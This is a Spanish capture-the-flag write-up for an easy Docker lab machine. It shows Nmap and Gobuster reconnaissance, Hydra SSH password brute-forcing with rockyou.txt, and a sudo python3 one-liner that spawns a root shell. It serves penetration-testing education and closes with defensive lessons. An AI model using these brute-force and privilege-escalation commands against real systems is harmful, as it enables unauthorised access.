# 🕵️‍♀️ Informe Técnico: Pequeñas-Mentirosas

* **Nivel:** Fácil
* **IP de la máquina:** 172.17.0.2
* **Objetivo:** Obtener acceso root en la máquina vulnerable a través de reconocimiento, acceso por fuerza bruta SSH y escalada de privilegios.
* **Logo de la máquina:**

![Logo](/Pequeñas-Mentirosas/Imagenes/Logo.png)

---

## 🔧 Despliegue de la Máquina

Primero, se descarga y descomprime la máquina vulnerable usando los siguientes comandos:

```bash
unzip Pequeñas-Mentirosas.zip
sudo bash auto_deploy.sh pequenas-mentirosas.tar
```

Esto despliega la máquina en un entorno Docker.

![Despliegue](/Pequeñas-Mentirosas/Imagenes/Despliegue.jpeg)

---

## 🌐 Verificación de Conectividad

Verificamos que haya conexión con la máquina ejecutando un `ping` a su IP:

```bash
ping -c1 172.17.0.2
```

![Ping](/Pequeñas-Mentirosas/Imagenes/Ping.jpeg)

---

## 🔍 Escaneo de Puertos

Se realiza un escaneo completo de puertos con Nmap:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Se detectan los puertos **22 (SSH)** y **80 (HTTP)** abiertos.

![Puertos Abiertos](/Pequeñas-Mentirosas/Imagenes/Puerto.jpeg)

Luego, se escanean los servicios en esos puertos:

```bash
extractPorts allPorts.txt
nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
```

![Servicios Detectados](/Pequeñas-Mentirosas/Imagenes/Servicio.jpeg)

---

## 🧭 Reconocimiento Web

Accediendo al puerto 80 en el navegador encontramos una página web con una pista visual:

![Página Web](/Pequeñas-Mentirosas/Imagenes/Pagina.jpeg)

Intentamos descubrir directorios ocultos con **Gobuster**:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 20 -add-slash -b 403,404 -x php,html,txt
```

No se encontraron resultados relevantes.

![Gobuster](/Pequeñas-Mentirosas/Imagenes/Fuzzing.jpeg)

---

## 🔐 Fuerza Bruta SSH (Usuario: `a`)

Aprovechando que el puerto SSH está abierto, se usa **Hydra** para intentar acceder:

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Se descubre la combinación válida:

* **Usuario:** `a`
* **Contraseña:** `secret`

![Hydra Usuario a](/Pequeñas-Mentirosas/Imagenes/Hydraa.jpeg)

Ingresamos por SSH:

```bash
ssh a@172.17.0.2
```

![Acceso SSH a](/Pequeñas-Mentirosas/Imagenes/SSHa.jpeg)

---

## 🔍 Enumeración y Descubrimiento de Usuario

Al revisar el sistema, encontramos que existe otro usuario llamado `spencer`.

![Usuarios](/Pequeñas-Mentirosas/Imagenes/Usuarios.jpeg)

---

## 🔐 Fuerza Bruta SSH (Usuario: `spencer`)

Volvemos a usar Hydra para descubrir la contraseña de `spencer`:

```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Se obtiene acceso con:

* **Usuario:** `spencer`
* **Contraseña:** `password1`

![Hydra Spencer](/Pequeñas-Mentirosas/Imagenes/Hydra.jpeg)

Ingresamos con:

```bash
ssh spencer@172.17.0.2
```

![SSH Spencer](/Pequeñas-Mentirosas/Imagenes/Spencer.jpeg)

---

## ⬆️ Escalada de Privilegios a Root

Dentro de la sesión como `spencer`, ejecutamos:

```bash
sudo -l
```

El sistema revela que podemos ejecutar **Python3 como root sin contraseña**:

```
(ALL) NOPASSWD: /usr/bin/python3
```

Esto nos permite ejecutar comandos como root usando Python. Escalamos con:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

Con esto, obtenemos una shell como **root**.

![Root](/Pequeñas-Mentirosas/Imagenes/root.jpeg)

---

## ✅ Conclusión

* 🧠 Se realizó reconocimiento de servicios expuestos.
* 🔑 Se obtuvo acceso por fuerza bruta al usuario `a`, y luego a `spencer`.
* 🚀 Se aprovechó un permiso sudo sin contraseña para escalar privilegios a **root** usando Python.

---

Si estás empezando en ciberseguridad, esta máquina es perfecta para entender la importancia de:

* Usar contraseñas seguras.
* Restringir permisos `sudo`.
* Evitar dejar pistas innecesarias en servicios web.
